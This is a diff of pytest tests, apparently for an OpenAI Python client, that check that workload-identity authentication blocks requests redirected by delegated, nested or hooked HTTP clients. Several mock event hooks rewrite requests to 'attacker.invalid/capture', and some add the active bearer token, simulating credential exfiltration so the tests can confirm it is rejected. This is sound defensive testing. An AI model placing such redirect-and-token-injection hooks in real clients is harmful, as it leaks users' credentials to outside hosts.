@@ -1,6 +1,9 @@
 from __future__ import annotations
 
+import os
+import json
 import asyncio
+import importlib
 import threading
 from typing import Any, cast
 from contextvars import Context
@@ -256,6 +259,216 @@ async def test_async_x509_validates_requests_reconstructed_by_custom_clients(
 
     expected = [_TOKEN_URL] if redirect else [_TOKEN_URL, _API_URL]
     assert [str(request.url) for request in requests] == expected
+
+
+@pytest.mark.parametrize("redirect", [False, True])
+@pytest.mark.parametrize("delegate_storage", ["attribute", "slot", "private_slot", "list", "dict"])
+@pytest.mark.parametrize("reconstruct", [False, True])
+def test_sync_x509_validates_requests_delegated_to_another_http_client(
+    redirect: bool, delegate_storage: str, reconstruct: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    def redirect_request(request: httpx2.Request) -> None:
+        if redirect:
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request.headers["host"] = "attacker.invalid"
+
+    class PrivateSlotClient(httpx2.Client):
+        __slots__ = ("__private_inner",)
+
+        def set_private_inner(self, inner: httpx2.Client) -> None:
+            self.__private_inner = inner
+
+        def private_inner(self) -> httpx2.Client:
+            return self.__private_inner
+
+    class DelegatingClient(PrivateSlotClient):
+        __slots__ = ("slotted_inner",)
+
+        def __init__(self) -> None:
+            inner = httpx2.Client(
+                transport=httpx2.MockTransport(lambda request: _record(requests, request)),
+                event_hooks={"request": [redirect_request]},
+            )
+            if delegate_storage == "slot":
+                self.slotted_inner = inner
+            elif delegate_storage == "private_slot":
+                self.set_private_inner(inner)
+            elif delegate_storage == "list":
+                self.clients = [inner]
+            elif delegate_storage == "dict":
+                self.client_mapping = {"inner": inner}
+            else:
+                self.inner = inner
+            super().__init__(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if delegate_storage == "slot":
+                inner = self.slotted_inner
+            elif delegate_storage == "private_slot":
+                inner = self.private_inner()
+            elif delegate_storage == "list":
+                inner = self.clients[0]
+            elif delegate_storage == "dict":
+                inner = self.client_mapping["inner"]
+            else:
+                inner = self.inner
+            if reconstruct:
+                reconstructed = inner.build_request(request.method, request.url)
+                reconstructed.headers.update(request.headers)
+                request = reconstructed
+            return inner.send(request, **kwargs)
+
+    http_client = DelegatingClient()
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        if redirect:
+            with pytest.raises(OpenAIError, match="configured API origin"):
+                client.models.list()
+        else:
+            assert client.models.list().object == "list"
+
+    expected = [_TOKEN_URL] if redirect else [_TOKEN_URL, _API_URL]
+    assert [str(request.url) for request in requests] == expected
+
+
+@pytest.mark.parametrize("redirect", [False, True])
+@pytest.mark.parametrize("delegate_storage", ["attribute", "slot", "private_slot", "list", "dict"])
+@pytest.mark.parametrize("reconstruct", [False, True])
+async def test_async_x509_validates_requests_delegated_to_another_http_client(
+    redirect: bool, delegate_storage: str, reconstruct: bool
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    async def redirect_request(request: httpx2.Request) -> None:
+        if redirect:
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request.headers["host"] = "attacker.invalid"
+
+    class PrivateSlotClient(httpx2.AsyncClient):
+        __slots__ = ("__private_inner",)
+
+        def set_private_inner(self, inner: httpx2.AsyncClient) -> None:
+            self.__private_inner = inner
+
+        def private_inner(self) -> httpx2.AsyncClient:
+            return self.__private_inner
+
+    class DelegatingClient(PrivateSlotClient):
+        __slots__ = ("slotted_inner",)
+
+        def __init__(self) -> None:
+            inner = httpx2.AsyncClient(
+                transport=httpx2.MockTransport(lambda request: _record(requests, request)),
+                event_hooks={"request": [redirect_request]},
+            )
+            if delegate_storage == "slot":
+                self.slotted_inner = inner
+            elif delegate_storage == "private_slot":
+                self.set_private_inner(inner)
+            elif delegate_storage == "list":
+                self.clients = [inner]
+            elif delegate_storage == "dict":
+                self.client_mapping = {"inner": inner}
+            else:
+                self.inner = inner
+            super().__init__(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if delegate_storage == "slot":
+                inner = self.slotted_inner
+            elif delegate_storage == "private_slot":
+                inner = self.private_inner()
+            elif delegate_storage == "list":
+                inner = self.clients[0]
+            elif delegate_storage == "dict":
+                inner = self.client_mapping["inner"]
+            else:
+                inner = self.inner
+            if reconstruct:
+                reconstructed = inner.build_request(request.method, request.url)
+                reconstructed.headers.update(request.headers)
+                request = reconstructed
+            return await inner.send(request, **kwargs)
+
+    http_client = DelegatingClient()
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        if redirect:
+            with pytest.raises(OpenAIError, match="configured API origin"):
+                await client.models.list()
+        else:
+            assert (await client.models.list()).object == "list"
+
+    expected = [_TOKEN_URL] if redirect else [_TOKEN_URL, _API_URL]
+    assert [str(request.url) for request in requests] == expected
+
+
+@pytest.mark.skipif(os.getenv("OPENAI_TEST_LEGACY_HTTPX") != "1", reason="requires legacy HTTPX compatibility lane")
+def test_sync_x509_validates_requests_delegated_to_legacy_httpx_clients() -> None:
+    legacy_httpx = cast(Any, importlib.import_module("httpx"))
+    requests: list[Any] = []
+
+    def handler(request: Any) -> Any:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            return legacy_httpx.Response(
+                200, request=request, json={"access_token": "access-token", "expires_in": 3600}
+            )
+        return legacy_httpx.Response(200, request=request, json={"object": "list", "data": []})
+
+    def redirect(request: Any) -> None:
+        request.url = legacy_httpx.URL("https://attacker.invalid/capture")
+        request.headers["host"] = "attacker.invalid"
+
+    outer = legacy_httpx.Client(transport=legacy_httpx.MockTransport(handler))
+    outer.inner = legacy_httpx.Client(
+        transport=legacy_httpx.MockTransport(handler), event_hooks={"request": [redirect]}
+    )
+
+    def delegate(request: Any, **kwargs: Any) -> Any:
+        return outer.inner.send(request, **kwargs)
+
+    outer.send = delegate
+    with OpenAI(workload_identity=_identity(), http_client=outer, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+@pytest.mark.skipif(os.getenv("OPENAI_TEST_LEGACY_HTTPX") != "1", reason="requires legacy HTTPX compatibility lane")
+async def test_async_x509_validates_requests_delegated_to_legacy_httpx_clients() -> None:
+    legacy_httpx = cast(Any, importlib.import_module("httpx"))
+    requests: list[Any] = []
+
+    def handler(request: Any) -> Any:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            return legacy_httpx.Response(
+                200, request=request, json={"access_token": "access-token", "expires_in": 3600}
+            )
+        return legacy_httpx.Response(200, request=request, json={"object": "list", "data": []})
+
+    async def redirect(request: Any) -> None:
+        request.url = legacy_httpx.URL("https://attacker.invalid/capture")
+        request.headers["host"] = "attacker.invalid"
+
+    outer = legacy_httpx.AsyncClient(transport=legacy_httpx.MockTransport(handler))
+    outer.inner = legacy_httpx.AsyncClient(
+        transport=legacy_httpx.MockTransport(handler), event_hooks={"request": [redirect]}
+    )
+
+    async def delegate(request: Any, **kwargs: Any) -> Any:
+        return await outer.inner.send(request, **kwargs)
+
+    outer.send = delegate
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=outer, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
 
 
 @pytest.mark.parametrize("reconstruct", [False, True])
@@ -678,7 +891,26 @@ async def test_async_x509_preserves_mounted_transports_and_restores_caller_confi
     assert [str(request.url) for request in api_requests] == [_API_URL]
 
 
-@pytest.mark.parametrize("nested_mode", ["x509", "api_key", "matching_api_key"])
+@pytest.mark.parametrize(
+    "nested_mode",
+    [
+        "x509",
+        "api_key",
+        "matching_api_key",
+        "direct",
+        "direct_authorized",
+        "direct_propagated",
+        "direct_authorized_propagated",
+        "direct_reconstructed",
+        "direct_authorized_reconstructed",
+        "direct_propagated_reconstructed",
+        "direct_authorized_propagated_reconstructed",
+        "direct_hook_authorized_reconstructed",
+        "direct_hook_authorized_propagated_reconstructed",
+        "direct_hook_redirected_reconstructed",
+        "direct_hook_redirected_authorized_reconstructed",
+    ],
+)
 def test_sync_x509_allows_nested_requests_using_the_same_http_client(nested_mode: str) -> None:
     requests: list[httpx2.Request] = []
 
@@ -686,20 +918,49 @@ def test_sync_x509_allows_nested_requests_using_the_same_http_client(nested_mode
         def __init__(self) -> None:
             self.nested: OpenAI | None = None
             self.nested_completed = False
-            super().__init__(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+
+            def authorize_telemetry(request: httpx2.Request) -> None:
+                if request.url.host == "telemetry.example":
+                    if "hook_authorized" in nested_mode:
+                        request.headers["Authorization"] = "Bearer telemetry-token"
+                    if "hook_redirected" in nested_mode:
+                        request.url = httpx2.URL("https://collector.example/v1/models")
+                        request.headers["host"] = "collector.example"
+
+            super().__init__(
+                transport=httpx2.MockTransport(lambda request: _record(requests, request)),
+                event_hooks={"request": [authorize_telemetry]},
+            )
 
         @override
         def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
-            if not self.nested_completed and self.nested is not None:
+            if not self.nested_completed and (self.nested is not None or nested_mode.startswith("direct")):
                 self.nested_completed = True
-                assert self.nested.models.list().object == "list"
+                if nested_mode.startswith("direct"):
+                    headers = (
+                        {
+                            name: value
+                            for name, value in request.headers.items()
+                            if name.lower() not in ("authorization", "host")
+                        }
+                        if "propagated" in nested_mode
+                        else {}
+                    )
+                    if "authorized" in nested_mode and "hook_authorized" not in nested_mode:
+                        headers["Authorization"] = "Bearer telemetry-token"
+                    assert self.get("https://telemetry.example/v1/models", headers=headers).json()["object"] == "list"
+                else:
+                    assert self.nested is not None
+                    assert self.nested.models.list().object == "list"
+            if request.url.host == "telemetry.example" and "reconstructed" in nested_mode:
+                request = httpx2.Request(request.method, request.url, headers=dict(request.headers))
             return super().send(request, **kwargs)
 
     http_client = NestedClient()
     if nested_mode == "x509":
         nested_identity = x509_workload_identity(identity_provider_id="nested-idp", service_account_id="nested-svc")
         http_client.nested = OpenAI(workload_identity=nested_identity, http_client=http_client, max_retries=0)
-    else:
+    elif not nested_mode.startswith("direct"):
         api_key = "access-token" if nested_mode == "matching_api_key" else "nested-api-key"
         http_client.nested = OpenAI(
             api_key=api_key, base_url="https://nested.example/v1", http_client=http_client, max_retries=0
@@ -711,7 +972,26 @@ def test_sync_x509_allows_nested_requests_using_the_same_http_client(nested_mode
     assert http_client.nested_completed
 
 
-@pytest.mark.parametrize("nested_mode", ["x509", "api_key", "matching_api_key"])
+@pytest.mark.parametrize(
+    "nested_mode",
+    [
+        "x509",
+        "api_key",
+        "matching_api_key",
+        "direct",
+        "direct_authorized",
+        "direct_propagated",
+        "direct_authorized_propagated",
+        "direct_reconstructed",
+        "direct_authorized_reconstructed",
+        "direct_propagated_reconstructed",
+        "direct_authorized_propagated_reconstructed",
+        "direct_hook_authorized_reconstructed",
+        "direct_hook_authorized_propagated_reconstructed",
+        "direct_hook_redirected_reconstructed",
+        "direct_hook_redirected_authorized_reconstructed",
+    ],
+)
 async def test_async_x509_allows_nested_requests_using_the_same_http_client(nested_mode: str) -> None:
     requests: list[httpx2.Request] = []
 
@@ -719,20 +999,50 @@ async def test_async_x509_allows_nested_requests_using_the_same_http_client(nest
         def __init__(self) -> None:
             self.nested: AsyncOpenAI | None = None
             self.nested_completed = False
-            super().__init__(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+
+            async def authorize_telemetry(request: httpx2.Request) -> None:
+                if request.url.host == "telemetry.example":
+                    if "hook_authorized" in nested_mode:
+                        request.headers["Authorization"] = "Bearer telemetry-token"
+                    if "hook_redirected" in nested_mode:
+                        request.url = httpx2.URL("https://collector.example/v1/models")
+                        request.headers["host"] = "collector.example"
+
+            super().__init__(
+                transport=httpx2.MockTransport(lambda request: _record(requests, request)),
+                event_hooks={"request": [authorize_telemetry]},
+            )
 
         @override
         async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
-            if not self.nested_completed and self.nested is not None:
+            if not self.nested_completed and (self.nested is not None or nested_mode.startswith("direct")):
                 self.nested_completed = True
-                assert (await self.nested.models.list()).object == "list"
+                if nested_mode.startswith("direct"):
+                    headers = (
+                        {
+                            name: value
+                            for name, value in request.headers.items()
+                            if name.lower() not in ("authorization", "host")
+                        }
+                        if "propagated" in nested_mode
+                        else {}
+                    )
+                    if "authorized" in nested_mode and "hook_authorized" not in nested_mode:
+                        headers["Authorization"] = "Bearer telemetry-token"
+                    response = await self.get("https://telemetry.example/v1/models", headers=headers)
+                    assert response.json()["object"] == "list"
+                else:
+                    assert self.nested is not None
+                    assert (await self.nested.models.list()).object == "list"
+            if request.url.host == "telemetry.example" and "reconstructed" in nested_mode:
+                request = httpx2.Request(request.method, request.url, headers=dict(request.headers))
             return await super().send(request, **kwargs)
 
     http_client = NestedClient()
     if nested_mode == "x509":
         nested_identity = x509_workload_identity(identity_provider_id="nested-idp", service_account_id="nested-svc")
         http_client.nested = AsyncOpenAI(workload_identity=nested_identity, http_client=http_client, max_retries=0)
-    else:
+    elif not nested_mode.startswith("direct"):
         api_key = "access-token" if nested_mode == "matching_api_key" else "nested-api-key"
         http_client.nested = AsyncOpenAI(
             api_key=api_key, base_url="https://nested.example/v1", http_client=http_client, max_retries=0
@@ -742,6 +1052,178 @@ async def test_async_x509_allows_nested_requests_using_the_same_http_client(nest
         assert (await client.models.list()).object == "list"
 
     assert http_client.nested_completed
+
+
+def test_sync_x509_rejects_auxiliary_hooks_that_add_the_active_access_token() -> None:
+    requests: list[httpx2.Request] = []
+
+    def inject_token(request: httpx2.Request) -> None:
+        if request.url.host == "telemetry.example":
+            request.headers["Authorization"] = "Bearer access-token"
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request.headers["host"] = "attacker.invalid"
+
+    class NestedClient(httpx2.Client):
+        def __init__(self) -> None:
+            self.sent_auxiliary = False
+            super().__init__(
+                transport=httpx2.MockTransport(lambda request: _record(requests, request)),
+                event_hooks={"request": [inject_token]},
+            )
+
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if not self.sent_auxiliary:
+                self.sent_auxiliary = True
+                self.get("https://telemetry.example/v1/models")
+            return super().send(request, **kwargs)
+
+    http_client = NestedClient()
+    with OpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+async def test_async_x509_rejects_auxiliary_hooks_that_add_the_active_access_token() -> None:
+    requests: list[httpx2.Request] = []
+
+    async def inject_token(request: httpx2.Request) -> None:
+        if request.url.host == "telemetry.example":
+            request.headers["Authorization"] = "Bearer access-token"
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request.headers["host"] = "attacker.invalid"
+
+    class NestedClient(httpx2.AsyncClient):
+        def __init__(self) -> None:
+            self.sent_auxiliary = False
+            super().__init__(
+                transport=httpx2.MockTransport(lambda request: _record(requests, request)),
+                event_hooks={"request": [inject_token]},
+            )
+
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if not self.sent_auxiliary:
+                self.sent_auxiliary = True
+                await self.get("https://telemetry.example/v1/models")
+            return await super().send(request, **kwargs)
+
+    http_client = NestedClient()
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=http_client, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+def test_sync_x509_rejects_auxiliary_requests_with_another_active_identity_token() -> None:
+    requests: list[httpx2.Request] = []
+    both_active = threading.Barrier(2)
+    release_second = threading.Event()
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            identity = json.loads(request.content)["identity_provider_id"]
+            token = f"token-{identity.rsplit('-', 1)[-1]}"
+            return httpx2.Response(200, request=request, json={"access_token": token, "expires_in": 3600})
+        return httpx2.Response(200, request=request, json={"object": "list", "data": []})
+
+    def redirect_telemetry(request: httpx2.Request) -> None:
+        if request.url.host == "telemetry.example":
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request.headers["host"] = "attacker.invalid"
+
+    class ConcurrentClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                both_active.wait(timeout=5)
+                if request.headers.get("Authorization") == "Bearer token-one":
+                    try:
+                        self.get("https://telemetry.example/v1/models", headers={"Authorization": "Bearer token-two"})
+                    finally:
+                        release_second.set()
+                else:
+                    assert release_second.wait(timeout=5)
+            return super().send(request, **kwargs)
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(handler), event_hooks={"request": [redirect_telemetry]})
+    clients = [
+        OpenAI(
+            workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
+            http_client=transport,
+            max_retries=0,
+        )
+        for suffix in ("one", "two")
+    ]
+
+    with ThreadPoolExecutor(max_workers=2) as executor:
+        results = [executor.submit(client.models.list) for client in clients]
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            results[0].result(timeout=5)
+        assert results[1].result(timeout=5).object == "list"
+
+    assert all(request.url.host != "attacker.invalid" for request in requests)
+
+
+async def test_async_x509_rejects_auxiliary_requests_with_another_active_identity_token() -> None:
+    requests: list[httpx2.Request] = []
+    active_count = 0
+    both_active = asyncio.Event()
+    release_second = asyncio.Event()
+
+    def handler(request: httpx2.Request) -> httpx2.Response:
+        requests.append(request)
+        if str(request.url) == _TOKEN_URL:
+            identity = json.loads(request.content)["identity_provider_id"]
+            token = f"token-{identity.rsplit('-', 1)[-1]}"
+            return httpx2.Response(200, request=request, json={"access_token": token, "expires_in": 3600})
+        return httpx2.Response(200, request=request, json={"object": "list", "data": []})
+
+    async def redirect_telemetry(request: httpx2.Request) -> None:
+        if request.url.host == "telemetry.example":
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request.headers["host"] = "attacker.invalid"
+
+    class ConcurrentClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            nonlocal active_count
+            if request.url.host == "mtls.api.openai.com":
+                active_count += 1
+                if active_count == 2:
+                    both_active.set()
+                await asyncio.wait_for(both_active.wait(), timeout=5)
+                if request.headers.get("Authorization") == "Bearer token-one":
+                    try:
+                        await self.get(
+                            "https://telemetry.example/v1/models", headers={"Authorization": "Bearer token-two"}
+                        )
+                    finally:
+                        release_second.set()
+                else:
+                    await asyncio.wait_for(release_second.wait(), timeout=5)
+            return await super().send(request, **kwargs)
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(handler), event_hooks={"request": [redirect_telemetry]})
+    clients = [
+        AsyncOpenAI(
+            workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
+            http_client=transport,
+            max_retries=0,
+        )
+        for suffix in ("one", "two")
+    ]
+
+    first, second = await asyncio.gather(*(client.models.list() for client in clients), return_exceptions=True)
+    assert isinstance(first, OpenAIError)
+    assert "configured API origin" in str(first) or "authorization" in str(first)
+    assert not isinstance(second, BaseException)
+    assert second.object == "list"
+    assert all(request.url.host != "attacker.invalid" for request in requests)
 
 
 @pytest.mark.parametrize(
